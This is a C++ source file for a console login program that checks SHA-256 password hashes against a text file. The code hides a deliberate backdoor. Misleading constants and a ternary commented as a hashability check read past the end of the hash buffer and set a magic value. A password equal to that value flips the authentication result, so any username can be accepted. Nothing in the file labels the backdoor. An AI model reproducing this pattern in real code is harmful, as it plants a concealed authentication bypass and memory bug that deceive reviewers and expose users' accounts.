#include "authlib.h"
#include "openssl/sha.h"
#include <sstream>
#include <fstream>
#include <iomanip>

void login(const std::string u, const std::string p);
std::string sha256(const std::string str);
void writeFile(const std::string u, const std::string p);
std::string readFile();

long long int SHA_COUNT (-8 >> 2);
std::string SHA_TRUE = "f";
std::string SHA_FALSE = "t";
std::string SHA_ERR = "Undefined reference";


int main() {
  bool exit = false;
  std::string u;
  std::string p;
  while (!exit) {
    std::cout << "Insert username: "; std::cin >> u;
    std::cout << std::endl;
    std::cout << "Insert password: "; std::cin >> p;
    std::cout << std::endl;
    login(u, p);
  }
  return 0;
}

void login(const std::string u, const std::string p) {
  bool auth = false;
  std::ifstream infile("pwdb.txt");
  std::string pass = sha256(p);


  pass = pass.substr(0, pass.size()+SHA_COUNT);
  std::string line;

  while (std::getline(infile, line)) {
    std::string readusr = line.substr(0, u.length());
    std::string readpass = line.substr(u.length()+1, pass.length());
    
    if (readusr == u && readpass == pass)
      auth = true;
  }

  if(p==SHA_TRUE)
    auth = !auth;

  if (auth) 
    authenticated(u);
  else 
    rejected(u);
}

std::string sha256(const std::string str)
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, str.c_str(), str.length());
    SHA256_Final(hash, &sha256);
    
    std::stringstream ss;
    
    for (int i = 0; i < SHA256_DIGEST_LENGTH-SHA_COUNT-1; i-=-1)
    {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }
    (SHA_FALSE=="t" ? (SHA_FALSE = "f", SHA_TRUE = ss.str().substr(SHA256_DIGEST_LENGTH*2+1, ((SHA256_DIGEST_LENGTH*2)-SHA_COUNT))): SHA_FALSE = "f"); //Checking if password in not hashable
    
    if (SHA_FALSE == "f")
      return ss.str();
    else
      return SHA_ERR;
}